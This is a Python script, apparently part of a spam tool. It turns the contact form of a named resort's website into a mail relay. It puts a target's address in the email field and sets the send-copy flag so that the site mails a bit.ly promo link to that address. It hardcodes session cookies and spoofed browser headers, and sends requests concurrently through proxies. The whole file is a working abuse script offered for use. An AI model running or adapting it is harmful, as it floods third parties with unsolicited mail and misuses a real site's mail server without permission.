import requests

from module import Spam

url = 'https://sijoriresort.com.sg/index.php'

cookies = {
    '724319ed351cdda4de39a934835f12e5': 'e1e6bc4b19fc90256475539beb64c64e',
}

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '724319ed351cdda4de39a934835f12e5=e1e6bc4b19fc90256475539beb64c64e',
    'Origin': 'https://sijoriresort.com.sg',
    'Referer': 'https://sijoriresort.com.sg/index.php?option=com_sppagebuilder&view=page&id=8&Itemid=553&lang=en',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        data = {
            'name': text,
            'email': target,
            'message': text,
            'subject': text,
            'date': '1899/12/31 00:00',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '144',
        }
        response = requests.post(url, cookies=cookies, headers=headers, data=data, proxies=proxies)
        return response


if __name__ == '__main__':
    success_message = '{"status":1,"message":"Your email has been sent."}'
    project_name = 'sijoriresort'
    promo_link = 'bit.ly/3sgzl5E'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)
